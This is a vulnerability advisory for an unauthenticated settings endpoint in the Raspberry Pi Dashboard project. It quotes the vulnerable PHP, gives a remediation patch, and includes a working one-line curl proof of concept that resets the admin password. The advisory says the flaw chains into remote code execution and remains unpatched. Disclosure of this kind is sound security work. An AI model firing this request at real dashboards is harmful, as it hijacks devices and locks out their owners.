# CVE-XXXX-XXXXX — Auth Bypass in Raspberry Pi Dashboard

| Field            | Value                                                                           |
|------------------|---------------------------------------------------------------------------------|
| Product          | [Raspberry Pi Dashboard](https://github.com/femto-code/Raspberry-Pi-Dashboard) |
| Version          | v0.1 – v1.1.6 (all releases)                                                    |
| File             | `backend/serv.php` (lines 100–119)                                              |
| CVE              | CVE-XXXX-XXXXX (pending)                                                        |
| CWE              | CWE-862 — Missing Authorization                                                 |
| CVSS 3.1 Vector  | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H                                            |
| CVSS Score       | 9.8 (Critical)                                                                  |
| Auth Required    | None                                                                            |
| Discovered by    | Lennart Hostettler                                                              |
| Date             | 12/06/2026                                                                      |

## Description

The `updateSettings` endpoint in `backend/serv.php` (lines 100–119) performs no authentication
or session check before processing POST data. Any unauthenticated network attacker can modify
arbitrary application settings — including the admin password — without possessing a valid session
or knowing the current credentials.

```php
// backend/serv.php, lines 100–119 — no session check
if(isset($_REQUEST["updateSettings"])){
  $allowed  = array_keys($config->get("thresholds"));
  $allowed2 = array_keys($config->get("general"));
  $edit["general"] = $config->get("general");

  foreach ($_POST as $key => $val) {
    if(in_array($key, $allowed2)){
      if($key == "pass"){
        $val = md5($val);          // [1] password accepted from any caller
      }
      $edit["general"][$key] = $val;
    }
  }
  echo $config->save($edit);       // [2] written to disk unconditionally
}
```

Every other sensitive endpoint (`checkShutdown`, `cancelShutdown`, shutdown trigger,
`sys_infos.php`) requires either a valid session or the correct password. Because `updateSettings`
allows an attacker to freely set that password, the authentication on all remaining endpoints is
effectively nullified.

## Proof of Concept

**Step 1 — Overwrite the admin password (unauthenticated)**

```bash
curl -X POST "http://<host>/backend/serv.php?updateSettings=1" \
  --data "pass=hacked"
```

Response: `1` (PHP `true` — `Config::save()` succeeded)

**Step 2 — Login with the new password**

The attacker now has full admin access. Combined with the OS Command Injection vulnerability
([CVE-XXXX-XXXXX — RCE](rpi-dashboard-rce.md)), this results in unauthenticated Remote Code
Execution on any deployment.

## Impact

- **Account takeover** — overwrite the admin password, locking the legitimate owner out
- **Authentication bypass for all endpoints** — once the password is set to a known value, every session-protected endpoint becomes accessible, including the shutdown RCE

## Remediation

Add a session validity check at the top of the `updateSettings` block, consistent with the guards
already present on `checkShutdown` and `cancelShutdown`:

```php
if(isset($_REQUEST["updateSettings"])){
  if(!isset($_SESSION["rpidbauth"])){
    echo "unauthorized";
    exit();
  }
  // ... existing settings logic
}
```


## Vendor Response

The developer declined to fix the vulnerability, arguing the project is not intended to be exposed to the internet. This position ignores reality: a Shodan search returns multiple publicly reachable instances. When a patch was submitted via pull request, the response was dismissive and confrontational. When that was pointed out, it escalated further. The vulnerabilities remain unpatched as of the date of this advisory.
